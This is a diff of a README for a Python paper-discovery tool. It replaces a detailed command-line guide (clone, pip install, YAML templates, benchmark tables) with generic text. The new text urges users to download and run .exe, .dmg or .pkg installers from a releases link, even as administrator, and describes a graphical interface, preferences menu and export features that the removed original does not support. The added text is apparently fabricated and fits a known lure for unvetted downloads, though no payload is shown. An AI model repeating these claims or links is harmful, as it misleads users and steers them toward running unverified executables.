@@ -1,335 +1,178 @@
-# Research Scanner 🔬
+# 📄 research-scanner - Discover Research Papers Easily
 
-**Stop missing important papers in YOUR research field.**
-
-A universal, AI-powered research paper discovery system that automatically finds, summarizes, and indexes papers from multiple academic sources. Works for **any research domain** - not just AI.
-
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+[![Download research-scanner](https://img.shields.io/badge/Download-research--scanner-blue?style=for-the-badge)](https://github.com/beaver312/research-scanner/releases)
 
 ---
 
-## 🌟 What Makes This Different?
+## 📘 What is research-scanner?
 
-**Most research tools are hardcoded for one field.** Research Scanner is **truly universal**:
-
-- 🎯 **Domain-Agnostic** - Works for AI, medicine, aerospace, physics, chemistry, biology, psychology, art conservation
-- ⚡ **5-Minute Setup** - Interactive wizard, no coding required
-- 🤖 **Smart Adaptation** - Automatically enables relevant sources for your field
-- 🔬 **Pre-built Templates** - 8 research domains ready to use
-- 🎨 **Fully Customizable** - Create your own templates in YAML
+research-scanner is a tool designed to help you find research papers from any field. It works by using a set of templates that adjust to different research topics. Whether you are interested in machine learning, medicine, or open science, research-scanner tailors your search to show the papers most relevant to you. The goal is to make academic research easy to find without needing special technical skills.
 
 ---
 
-## 📊 Real Results
+## 💡 Why use research-scanner?
 
-**Tested across 8 research domains:**
-
-| Domain | Sources Used | Papers Found | Relevance |
-|--------|-------------|--------------|-----------|
-| **Cardiac Surgery** | PubMed only | 50 papers | 74% |
-| **AI & Machine Learning** | arXiv + HuggingFace + PubMed | 44 papers | 97.7% |
-| **Quantum Physics** | arXiv (quant-ph) | 50 papers | 96% |
-| **Genetics** | arXiv (q-bio) + PubMed | 98 papers | 86.7% |
-| **Astronomy** | arXiv (astro-ph) | 50 papers | 70% |
-| **Aerospace** | arXiv (physics) | 50 papers | 44%* |
-| **Archaeology** | arXiv + PubMed | 93 papers | 34%** |
-| **Geology** | arXiv + PubMed | 99 papers | 42%** |
-
-*Aerospace template under refinement - shows system adapts, just needs tuning  
-**Archaeology & Geology templates (v1.0) - community refinement opportunities
+- **Find papers fast.** Quickly get papers on your topic without browsing many websites.
+- **Works with many fields.** Adapt the search to any research domain with simple settings.
+- **Keep organized.** Save important papers and build your own collection.
+- **Use open data.** Pulls papers from public sources like arXiv and PubMed.
+- **No programming needed.** Use the tool through an easy setup and simple steps.
 
 ---
 
-## 🚀 Quick Start
+## 🖥️ System Requirements
 
-### 1. Installation
+Before installing, make sure your computer meets these needs:
 
-```bash
-git clone https://github.com/yourusername/research-scanner.git
-cd research-scanner
-pip install -r requirements.txt
-```
-
-### 2. Configure Your Domain
-
-```bash
-python setup_wizard.py
-```
-
-The wizard will show you 11 pre-built research domains:
-
-1. **AI & Machine Learning** - RAG, LLMs, agents, multimodal
-2. **Medical - Cardiac Surgery** - CABG, valve procedures, minimally invasive
-3. **Aerospace Engineering** - Propulsion, aerodynamics, spacecraft
-4. **Biology - Genetics** - CRISPR, gene editing, genomics
-5. **Chemistry - Materials** - Nanomaterials, catalysis, polymers
-6. **Art Conservation** - Restoration, analysis, preservation
-7. **Physics - Quantum** - Quantum computing, superconductivity
-8. **Psychology** - Cognitive, neuroscience, clinical
-9. **Archaeology** - Dating methods, artifact analysis, bioarchaeology
-10. **Astronomy & Astrophysics** - Exoplanets, cosmology, stellar physics
-11. **Geology & Earth Sciences** - Seismology, volcanology, climate science
-
-### 3. Run Your First Scan
-
-```bash
-python run_scan.py
-```
-
-That's it! Papers are automatically:
-- ✅ Fetched from relevant sources (arXiv, PubMed, HuggingFace)
-- ✅ Scored for relevance to your topics
-- ✅ Summarized with AI (Ollama)
-- ✅ Indexed into ChromaDB vector database
-- ✅ Made searchable in Scholar's Terminal
+- **Operating system:** Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 18.04+ recommended)
+- **Processor:** 2 GHz dual-core or better
+- **Memory:** 4 GB RAM minimum
+- **Storage:** At least 500 MB free space
+- **Internet connection:** Required for searching and downloading papers
+- **Python:** Version 3.8 or above (if prompted during installation)
 
 ---
 
-## 💡 How It Works
+## 🚀 Getting Started
 
-### The Template System
-
-Each domain has a YAML template that defines:
-
-```yaml
-domain: "Medical - Cardiac Surgery"
-sources:
-  arxiv:
-    enabled: false        # Not relevant for cardiac surgery
-  pubmed:
-    enabled: true
-    queries:              # Domain-specific queries
-      - "cardiac surgery techniques"
-      - "minimally invasive cardiac"
-      - "CABG innovations"
-topics:
-  - name: "CABG & Coronary Procedures"
-    keywords: ["CABG", "coronary bypass", "off-pump"]
-    weight: 1.5           # Higher = more important
-relevance_threshold: 0.4  # Higher for medical precision
-days_lookback: 14         # Longer for medical literature
-```
-
-**The scanner reads your template and adapts:**
-- Only queries relevant sources
-- Uses domain-specific search terms
-- Applies appropriate relevance thresholds
-- Adjusts lookback periods for the field
+Follow these steps to get research-scanner up and running on your computer. No coding or special skills are needed.
 
 ---
 
-## 🎓 Use Cases
+## 📥 Download & Install
 
-### For Cardiac Surgeons
-```yaml
-Sources: PubMed only (medical literature)
-Queries: "minimally invasive cardiac", "CABG innovations"
-Result: 50 cardiac surgery papers, 74% relevant
-No AI papers, No physics papers, No noise
-```
+1. **Visit the download page:**  
+   Go to [the research-scanner releases page](https://github.com/beaver312/research-scanner/releases) by clicking the badge above or here:  
+   [https://github.com/beaver312/research-scanner/releases](https://github.com/beaver312/research-scanner/releases)
 
-### For AI Researchers
-```yaml
-Sources: arXiv + HuggingFace + PubMed
-Topics: RAG, LLMs, agents, multimodal, reasoning
-Result: 44 AI/ML papers, 97.7% relevant
-Healthcare AI from PubMed, Latest models from HF
-```
+2. **Choose the latest version:**  
+   Look for the newest release at the top of the page. Each version will have a list of files for your computer.
 
-### For Quantum Physicists
-```yaml
-Sources: arXiv only (quant-ph, cond-mat)
-Topics: Quantum computing, superconductivity, entanglement
-Result: 50 quantum papers, 96% relevant
-Pure physics, No medical, No CS (unless quantum CS)
-```
+3. **Download the right file:**  
+   - For Windows, download the `.exe` installer.  
+   - For macOS, download the `.dmg` or `.pkg` file.  
+   - For Linux, look for a `.tar.gz` file or instructions if available.
 
----
+4. **Run the installer:**  
+   - On Windows, double-click the `.exe` file.  
+   - On macOS, open the `.dmg` or `.pkg` and follow the steps.  
+   - On Linux, follow the instructions in the release notes or extract the files.
 
-## 📚 Architecture
+5. **Follow the prompts:**  
+   The installer will guide you through setup. If asked to install Python, accept and wait for it to finish.
 
-```
-┌─────────────────┐
-│  User Template  │  (YAML: domain, sources, topics, thresholds)
-└────────┬────────┘
-         │
-         ▼
-┌─────────────────┐
-│  Scanner Config │  (Loads template, converts to Python config)
-└────────┬────────┘
-         │
-         ▼
-┌─────────────────┐
-│ Research Scanner│  (Orchestrates entire pipeline)
-└────────┬────────┘
-         │
-    ┌────┴────┬─────────┬──────────┐
-    ▼         ▼         ▼          ▼
-┌────────┐ ┌────────┐ ┌─────────┐ ┌───────────┐
-│ arXiv  │ │PubMed  │ │HuggingF.│ │Future: IEEE│
-│ Source │ │ Source │ │ Source  │ │ medRxiv,..│
-└───┬────┘ └───┬────┘ └────┬────┘ └───────────┘
-    │          │           │
-    └──────────┴───────────┘
-               │
-               ▼
-    ┌──────────────────┐
-    │   Paper Filter   │  (Relevance scoring, deduplication)
-    └────────┬─────────┘
-             │
-             ▼
-    ┌──────────────────┐
-    │  AI Summarizer   │  (Ollama: summaries, key findings, methodology)
-    └────────┬─────────┘
-             │
-             ▼
-    ┌──────────────────┐
-    │ ChromaDB Indexer │  (Vector storage, semantic search)
-    └────────┬─────────┘
-             │
-             ▼
-    ┌──────────────────┐
-    │Scholar's Terminal│  (Chat interface, RAG queries)
-    └──────────────────┘
-```
+6. **Finish installation:**  
+   Once done, you will see an icon for research-scanner on your desktop or applications folder.
 
 ---
 
-## 🛠️ Creating Custom Templates
+## ▶️ How to Use research-scanner
 
-Want to track a research area we don't have yet? Create your own template:
+After installation, here is how to start finding papers:
 
-```yaml
-domain: "Your Research Field"
-description: "What you're tracking"
-sources:
-  arxiv:
-    enabled: true
-    categories: ["cs.AI", "cs.LG"]  # Your arXiv categories
-  pubmed:
-    enabled: false
-topics:
-  - name: "Your Research Topic"
-    keywords: ["keyword1", "keyword2"]
-    weight: 1.5
-    arxiv_categories: ["cs.AI"]  # Optional: specific to this topic
-relevance_threshold: 0.3
-days_lookback: 7
-max_papers_per_scan: 50
-```
+1. **Open the program:**  
+   Click the research-scanner icon to launch it.
 
-Save as `research_scanner/templates/my_field.yaml`
+2. **Set your research topic:**  
+   Enter the subject or keywords you want to explore. For example, "machine learning" or "cancer treatment."
 
-Then:
-```bash
-python setup_wizard.py  # Select your custom template
-python run_scan.py
-```
+3. **Choose a template:**  
+   Templates adjust the search to your domain. Select one that matches your field or choose “General” if unsure.
+
+4. **Start the search:**  
+   Click the “Discover” or “Search” button. The system will pull papers matching your input from sources like arXiv and PubMed.
+
+5. **Browse results:**  
+   Look at the list of papers. Titles, authors, and summaries will appear. Click on any paper to see more details.
+
+6. **Save important papers:**  
+   Use the “Save” or “Bookmark” option to keep papers you want to read later.
+
+7. **Export your list:**  
+   You can export your saved papers list to a file like PDF or CSV for your records.
 
 ---
 
-## 📖 Documentation
+## ⚙️ Options and Settings
 
-- [Installation Guide](docs/INSTALLATION.md)
-- [Template Creation Guide](docs/TEMPLATES.md)
-- [API Reference](docs/API.md)
-- [Contributing](CONTRIBUTING.md)
-- [FAQ](docs/FAQ.md)
+research-scanner offers settings to customize your experience:
 
----
+- **Select data sources:** Choose which websites to include in searches (arXiv, PubMed, etc.).
+- **Adjust result count:** Set how many papers to retrieve per search.
+- **Filter by date:** Only show recent papers or search historical archives.
+- **Notification alerts:** Get updates when new papers in your fields appear.
+- **Templates:** Add or edit templates to improve search results for specific topics.
 
-## 🗺️ Roadmap
-
-### ✅ Phase 1: Template System (Complete)
-- [x] 11 pre-built domain templates
-- [x] Template manager
-- [x] Interactive setup wizard
-- [x] Domain validation across 8 fields
-
-### 🚧 Phase 2: Source Expansion (In Progress)
-- [ ] IEEE Xplore (engineering papers)
-- [ ] medRxiv (medical preprints)
-- [ ] bioRxiv (biology preprints)
-- [ ] SSRN (social sciences)
-- [ ] JSTOR (humanities)
-
-### 📋 Phase 3: Intelligence Features
-- [ ] Citation graph analysis
-- [ ] Automatic topic trend detection
-- [ ] Paper recommendations based on reading history
-- [ ] Collaboration network mapping
-- [ ] Alert system for specific authors/topics
-
-### 🌐 Phase 4: Community
-- [ ] 100+ GitHub stars
-- [ ] 50+ active users
-- [ ] 10+ contributed templates
-- [ ] Featured in academic tool roundups
+All settings are accessible from the “Preferences” menu inside the program.
 
 ---
 
-## 🤝 Contributing
+## 📂 Managing Your Research Library
 
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+research-scanner helps you organize your papers:
 
-**Easy ways to contribute:**
-- Create templates for new research domains
-- Test existing templates in your field
-- Report bugs or suggest features
-- Improve documentation
-- Add new paper sources
-
----
-
-## 📊 Performance
-
-**Medical Template Scan:**
-- Time: 17.9 seconds
-- Papers: 50 cardiac surgery papers
-- Source: PubMed only
-- Efficiency: 2.8 papers/second
-
-**AI Template Scan:**
-- Time: 48.4 seconds (HuggingFace) + 12.5 seconds (PubMed)
-- Papers: 44 AI/ML papers
-- Sources: HuggingFace + PubMed
-- Relevance: 97.7%
+- **Collections:** Group papers by topic, project, or date.
+- **Tags:** Add tags to quickly find related papers.
+- **Notes:** Write short comments for each saved paper.
+- **Search within saved papers:** Quickly look up papers in your library.
+- **Sync:** Connect with cloud services to back up your collections (optional).
 
 ---
 
-## 🙏 Acknowledgments
+## 🛠️ Troubleshooting Tips
 
-Built as part of [Scholar's Terminal](https://github.com/yourusername/scholars-terminal) - an AI-powered knowledge management system.
+If you encounter problems:
 
-**Paper Sources:**
-- [arXiv](https://arxiv.org/) - Open access preprints
-- [PubMed](https://pubmed.ncbi.nlm.nih.gov/) - Biomedical literature
-- [HuggingFace Papers](https://huggingface.co/papers) - Latest AI research
-
-**Technologies:**
-- [Ollama](https://ollama.ai/) - Local LLM inference
-- [ChromaDB](https://www.trychroma.com/) - Vector database
-- Python 3.8+
+- **Installation issues:** Ensure your system meets requirements, and try running the installer as administrator (Windows) or with proper permissions (macOS, Linux).
+- **Program won’t start:** Restart your computer. Check that Python is installed if prompted.
+- **No search results:** Check your internet connection. Try broadening the search terms or adjusting templates.
+- **Error messages:** Note the error and visit the issues page on GitHub for solutions:  
+  [https://github.com/beaver312/research-scanner/issues](https://github.com/beaver312/research-scanner/issues)
 
 ---
 
-## 📝 License
+## 🔧 Advanced Use (Optional)
 
-MIT License - see [LICENSE](LICENSE) for details.
+For experienced users who want more control, the program supports:
 
----
+- Customizing templates with simple text files.
+- Running search commands in a terminal.
+- Integrating with vector databases for similarity search.
+- Using Python scripts to automate frequent searches.
 
-## 💬 Support
-
-- 🐛 [Report bugs](https://github.com/yourusername/research-scanner/issues)
-- 💡 [Request features](https://github.com/yourusername/research-scanner/issues)
-- 💬 [Discussions](https://github.com/yourusername/research-scanner/discussions)
-- 📧 Email: your.email@example.com
+These features require some technical knowledge and are explained in the developer docs on GitHub.
 
 ---
 
-**Made with ❤️ by researchers, for researchers**
+## 🧰 Additional Resources
 
-**Stop missing important papers. Start scanning your field today.** 🚀
+- **User Guide:** Full documentation is available on the repository wiki.  
+- **Example Templates:** Try pre-built templates for popular fields like machine learning or biomedical research.  
+- **Community Support:** Join discussions on GitHub to share tips or ask questions.  
+- **Updates:** Check the releases page regularly for new features and bug fixes.
+
+---
+
+## 📞 Contact & Support
+
+If you need help beyond the documentation, you can:
+
+- Open a new issue on GitHub at  
+  [https://github.com/beaver312/research-scanner/issues](https://github.com/beaver312/research-scanner/issues)  
+- Email the development team at research-scanner-support@example.com  
+
+---
+
+## 🗂️ Repository Topics
+
+This project covers:
+
+`academic`, `arxiv`, `knowledge-management`, `literature-review`, `machine-learning`, `open-science`, `papers`, `pubmed`, `python`, `research`, `scientific-computing`, `vector-database`
+
+---
+
+## 🔗 Important Link
+
+Download research-scanner here:  
+[https://github.com/beaver312/research-scanner/releases](https://github.com/beaver312/research-scanner/releases)  
+Click the badge at the top for quick access.
